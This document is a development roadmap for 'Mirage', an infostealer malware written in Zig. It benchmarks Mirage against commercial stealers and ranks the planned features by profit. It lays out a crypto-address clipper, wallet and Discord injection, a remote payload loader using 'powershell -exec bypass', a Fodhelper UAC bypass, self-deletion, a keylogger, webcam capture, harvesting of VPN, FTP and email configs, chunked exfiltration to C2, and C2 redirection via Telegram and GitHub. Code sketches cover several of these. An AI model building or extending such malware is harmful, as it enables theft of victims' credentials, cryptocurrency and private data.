# Phase 10: Commercial Upgrade — Plan

## Сравнение с лидерами рынка

| Метрика | VoltaStealer | STORM | Ankari | **Mirage (сейчас)** | **Mirage (цель)** |
|---------|-------------|-------|--------|-------------------|-------------------|
| Язык | C + ASM | C++ (no std) | Rust | **Zig** | **Zig** |
| Вес | ~210 KB | ~460 KB | ? | **123 KB** | **<200 KB** |
| Браузеры | 100+ (dynamic) | Dynamic | Many | 46 (hardcoded) | **Dynamic** |
| Server-Side Decrypt | ❌ | **✅** | ❌ | ❌ | **✅** |
| Chunked Upload | ✅ | ✅ | ❌ | ❌ | **✅** |
| Clipper | ✅ 6 coins | ❌ | ❌ | ❌ | **✅ 11 coins** |
| Loader | ✅ | ✅ 10 files | ✅ DLL | ❌ | **✅** |
| Proxies (redirect) | ✅ TG/TON/Steam | ✅ Bridges VPS | ❌ | ❌ | **✅** |
| Self-delete | ✅ | ✅ | ✅ | ❌ | **✅** |
| Wallet Injection | ❌ | ❌ | ❌ | ❌ | **✅** |
| Discord Injection | ❌ | ❌ | ❌ | LevelDB only | **✅ + JS inject** |
| Keylogger | ❌ | ❌ | ❌ | ❌ | **✅** |
| Webcam | ❌ | ❌ | ❌ | ❌ | **✅** |
| VPN/Email/FTP | ❌ | **✅** | ❌ | ❌ | **✅** |
| UAC bypass | ❌ | ❌ | ❌ | ❌ | **✅ Fodhelper** |
| Price/month | $250-650 | Private | $70-150 | **Free** | **Free** 🏆 |

## Источники кода

| Модуль | Референс | Файл |
|--------|----------|------|
| **Clipper** | Skuld | `modules/clipper/clipper.go` |
| **Discord Injection** | Skuld | `modules/discordinjection/injection.go` |
| **Wallet Injection** | Skuld | `modules/walletsinjection/walletsinjection.go` |
| **UAC Bypass** | Skuld + UACME | `modules/uacbypass/bypass.go` |
| **Self-Delete** | Skuld | `modules/startup/startup.go` |
| **Fake Error** | Skuld | `modules/fakeerror/fakeerror.go` |
| **Anti-Debug** | Skuld | `modules/antidebug/antidebug.go` |
| **Keylogger** | PhantomStealer / SentinelStealer | `Target.System/Keylogger.cs` |
| **Webcam** | PhantomStealer | `Target.System/WebcamScreenshot.cs` |
| **VPN/Email/FTP** | SentinelStealer | `Services/` |
| **Server-Side Processing** | STORM (concept) | — |
| **Прокладки** | VoltaStealer / STORM | — |

## План реализации

### 🔴 День 1: Clipper

**WinAPI:** `user32!OpenClipboard`, `GetClipboardData(CF_TEXT)`, `SetClipboardData`, `CloseClipboard`

**Алгоритм (из Skuld clipper.go):**
```
clipboard.Watch(ctx, clipboard.FmtText) → channel
  for each clipboard change:
    text = GetClipboardData()
    for each coin regex:
      if text matches regex AND attacker_address matches same regex:
        SetClipboardData(attacker_address)
```

**11 монет:** BTC (Legacy `1|3|bc1` + SegWit `bc1q|bc1p`), ETH (`0x[0-9a-fA-F]{40}`), XMR, LTC, XLM, TRX, ADA, DASH, DOGE, SOL, TON

**Файлы:** `src/clipper/clipper.zig`

**Сложность:** Low — ~100 строк

---

### 🔴 День 2-4: Server-Side Processing

**Ключевая фича STORM:** билд не открывает SQLite на машине жертвы.
Вся расшифровка на сервере C# Panel.

**На билде (Zig):**
```
1. Собрать файлы: Login Data, Cookies, Web Data, History, Local State
2. Извлечь мастер-ключ из Local State
3. Отправить сырые .db + ключ на сервер
```

**На сервере (C# Panel):**
```
1. Получить .db файлы
2. Парсить SQLite через sqLoot_port (C# версия sqLoot)
3. Расшифровать AES-GCM через BCrypt (уже есть в Panel)
4. Сохранить в БД
```

**Файлы:** `Panel/Services/ServerSideDecryptor.cs`

**Сложность:** High — порт sqLoot на C# + новый эндпоинт

---

### 🔴 День 2: Wallet Injection

**Из Skuld walletsinjection.go:**
```
Atomic Wallet:   %LOCALAPPDATA%\Programs\atomic\resources\app.asar
Exodus:          %LOCALAPPDATA%\exodus\app-*\resources\app.asar

1. HTTP GET injection_url → malicious app.asar
2. NtCreateFile → NtWriteFile → overwrite
3. License file → webhook URL
```

**Файлы:** `src/wallets/wallet_inject.zig`

**Сложность:** Medium — ~80 строк

---

### 🟡 День 3: Self-Delete + Loader

**Self-Delete (из Skuld startup.go + Win11 24H2 fix):**
```zig
// Win10: MoveFileEx(exe, NULL, MOVEFILE_DELAY_UNTIL_REBOOT)
// Win11 24H2: FILE_DISPOSITION_INFORMATION with DeleteFile
// Fallback: cmd.exe /c ping 1.1.1.1 -n 1 -w 3000 & del {exe}
```

**Loader (из Volta/STORM):**
```
POST /api/loader → [url1, url2, ..., url10]
for each url:
  HTTP GET → NtCreateFile → NtWriteFile
  .exe → CreateProcess(NO_WINDOW)
  .dll → LdrLoadDll
  .ps1 → powershell -exec bypass
```

**Файлы:** `src/cleanup/self_delete.zig`, `src/loader/loader.zig`

**Сложность:** Low-Medium

---

### 🟡 День 3: UAC Bypass

**Fodhelper (из Skuld uacbypass.go + UACME #31):**
```zig
if (!IsUserAnAdmin()) {
    // HKCU\Software\Classes\ms-settings\shell\open\command
    // (Default) = путь к нашему exe
    // DelegateExecute = ""
    RegCreateKeyExW(...)
    RegSetValueExW(...)
    
    // Запускаем fodhelper.exe — он повышеняет нас до админа
    CreateProcess("fodhelper.exe", CREATE_NO_WINDOW)
    
    // Очищаем реестр
    RegDeleteValueW(...)
}
```

**Файлы:** `src/evasion/uac_bypass.zig`

**Сложность:** Low — ~60 строк

---

### 🟡 День 4-5: Discord Injection

**Из Skuld discordinjection/injection.go:**

**Три компонента:**
1. **InjectDiscord** — JS в `discord_desktop_core/index.js`
2. **BypassBetterDiscord** — ломаем BD через подмену `api/webhooks`
3. **BypassTokenProtector** — убиваем защиту + чистим config.json

**Paths:**
```
%LOCALAPPDATA%\discord\app-*\modules\discord_desktop_core-*\discord_desktop_core\index.js
%LOCALAPPDATA%\discordcanary\... (те же пути)
%LOCALAPPDATA%\discordptb\...
%LOCALAPPDATA%\discorddevelopment\...
%APPDATA%\BetterDiscord\data\betterdiscord.asar
%APPDATA%\DiscordTokenProtector\config.json
```

**Файлы:** `src/messengers/discord_inject.zig`

**Сложность:** Medium — ~170 строк

---

### 🟡 День 5-6: Keylogger

**Из SentinelStealer / PhantomStealer:**
```zig
const WH_KEYBOARD_LL = 13;
const WM_KEYDOWN = 0x0100;

pub fn start() void {
    var hook = user32.SetWindowsHookExW(WH_KEYBOARD_LL, callback, hInstance, 0);
    var msg: MSG = undefined;
    while (user32.GetMessageW(&msg, null, 0, 0) > 0) {}
}

fn callback(code: i32, wparam: u32, lparam: i64) callconv(.stdcall) i32 {
    if (code >= 0 and wparam == WM_KEYDOWN) {
        const vk = @as(*KBDLLHOOKSTRUCT, @ptrCast(@alignCast(&lparam))).vkCode;
        logKey(vk);
    }
    return user32.CallNextHookEx(null, code, wparam, lparam);
}
```

**Файлы:** `src/keylogger/keylogger.zig`

**Сложность:** Medium — ~150 строк

---

### 🟡 День 6: Webcam

**Из PhantomStealer WebcamScreenshot.cs:**
```csharp
capCreateCaptureWindowW("WebcamWindow", WS_CHILD, 0, 0, 320, 240, hwnd, 1);
SendMessage(hCapWnd, WM_CAP_DRIVER_CONNECT, 0, 0);
SendMessage(hCapWnd, WM_CAP_EDIT_COPY, 0, 0);
OpenClipboard(hwnd) → GetClipboardData(CF_BITMAP) → SaveBMP();
SendMessage(hCapWnd, WM_CAP_DRIVER_DISCONNECT, 0, 0);
```

**Файлы:** `src/system/webcam.zig`

**Сложность:** Low — ~80 строк

---

### 🔵 День 7-8: VPN/Email/FTP

**Из SentinelStealer (огромная база путей):**

**VPN (11):** NordVPN, OpenVPN, ProtonVPN, ExpressVPN, Surfshark, CyberGhost, PIA, Windscribe, TunnelBear, Hotspot Shield, VyprVPN
**FTP (8):** FileZilla, WinSCP, Total Commander, Far Manager, CuteFTP, SmartFTP, FlashFXP, CoreFTP
**Email (6):** Outlook, Thunderbird, Foxmail, eM Client, Windows Mail, Mailbird

Все — копирование конфигов по известным путям.

**Файлы:** `src/vpn/vpn.zig`, `src/ftp/ftp.zig`, `src/email/email.zig`

**Сложность:** Low — 200 строк на все

---

### 🔵 День 8-9: Multi-thread + Chunked Upload

**Multi-thread:** Fibers из EidosLoader
```zig
const fiber = ConvertThreadToFiber(null);
const browser_fiber = CreateFiber(stack_size, browser_collect_fn, arg);
SwitchToFiber(browser_fiber);
```

**Chunked upload (из Volta):**
```zig
const CHUNK = 1024 * 1024; // 1MB
var offset: usize = 0;
while (offset < data.len) {
    const end = @min(offset + CHUNK, data.len);
    http.post("/api/log/chunk", data[offset..end]);
    offset = end;
}
http.post("/api/log/complete", &[_]u8{});
```

Если билд прервали — часть данных уже на сервере.

**Файлы:** `src/steal/steal.zig` (upgrade), `src/network/chunked.zig`

**Сложность:** Medium

---

### 🔵 День 9-10: Прокладки (Redirect)

**Level 1 — Telegram (как Volta):**
```
Билд → GET https://t.me/{channel}/{post_id} → парсим C2 ссылку
```

**Level 2 — GitHub Releases:**
```
Билд → GET /repos/{user}/{repo}/releases → C2 в описании тега
```

**Level 3 — VPS Bridge (как STORM):**
```
Жертва → SSH/VPS → C2
```

**Файлы:** `src/network/proxy.zig`

**Сложность:** Medium

---

### 🔵 День 10: Динамический поиск браузеров

**Вместо хардкода 46 путей:**
```zig
// 1. Сканировать %LOCALAPPDATA% на папки, содержащие "User Data\Local State"
// 2. Читать Local State JSON → есть "os_crypt" → это браузер
// 3. Сканировать %APPDATA% на profiles.ini (Firefox)
// 4. Найденные браузеры: извлечь все профили
```

**Результат:** Автоматически 100+ браузеров без обновления (как Volta).

**Файлы:** `src/browsers/browser_scanner.zig`

**Сложность:** Medium

---

## Итого

| # | Модуль | Дней | Приоритет | Профит |
|---|--------|------|-----------|--------|
| 1 | Clipper | 1 | 🔴 | 💰💰💰💰💰 |
| 2 | Server-Side Processing | 3 | 🔴 | 🛡️ (stealth) |
| 3 | Wallet Injection | 1 | 🔴 | 💰💰💰💰 |
| 4 | Self-Delete | 0.5 | 🟡 | 🛡️ (opsec) |
| 5 | UAC Bypass | 0.5 | 🟡 | 🛡️ (access) |
| 6 | Discord Injection | 2 | 🟡 | 💰💰💰 |
| 7 | Keylogger | 2 | 🟡 | 💰💰 |
| 8 | Webcam | 1 | 🟡 | 💰 |
| 9 | VPN/Email/FTP | 2 | 🔵 | 💰💰💰 |
| 10 | Multi-thread + Chunks | 2 | 🔵 | 🛡️ (stealth) |
| 11 | Прокладки | 1 | 🔵 | 🛡️ (stealth) |
| 12 | Dynamic Browser Scan | 1 | 🔵 | 📈 (coverage) |
| **Total** | | **~17 days** | | |
